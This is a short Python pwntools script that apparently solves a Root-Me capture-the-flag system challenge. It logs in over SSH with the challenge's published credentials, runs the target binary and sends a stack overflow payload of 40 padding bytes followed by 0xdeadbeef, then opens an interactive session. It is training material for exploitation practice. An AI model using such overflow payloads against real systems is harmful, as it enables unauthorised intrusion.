import os
from pwn import *

# SSH connection details
ssh_host = 'challenge02.root-me.org'
ssh_port = 2222
ssh_user = 'app-systeme-ch13'
ssh_password = 'app-systeme-ch13'  # Replace this with the correct password if required

# Connect via SSH
ssh_connection = ssh(host=ssh_host, port=ssh_port, user=ssh_user, password=ssh_password)

channel = ssh_connection.run('pwd')
pwd_output = channel.recv().decode().strip()
elf_file_path = os.path.join(pwd_output, 'ch13')

# Print the combined absolute path
print(f"Full path to ELF file: {elf_file_path}")
# Now let's load the ELF object locally
p = ssh_connection.process(elf_file_path)  # Start the binary

# Receive any initial output if there is any, to allow us to explore the program's behavior
# (Modify this as necessary if the program expects a prompt before you send input)
# initial_output = p.recv(1024)
# print(f"Initial output from ./ch13: {initial_output.decode()}")

# b'\xef\xbe\xad\xde' or p32(0xdeadbeef)
payload = b'a' * 40 + p32(0xdeadbeef)  
# + p32(0xdeadbeef)
p.sendline(payload)  # Send input to the binary
p.interactive()
# # Receive and print the result/output after sending the input
# result = p.recvall(timeout=2)  # Read all output after sending input
# print(f"Output after sending buffer: {result.decode()}")

# Close the SSH connection
ssh_connection.close()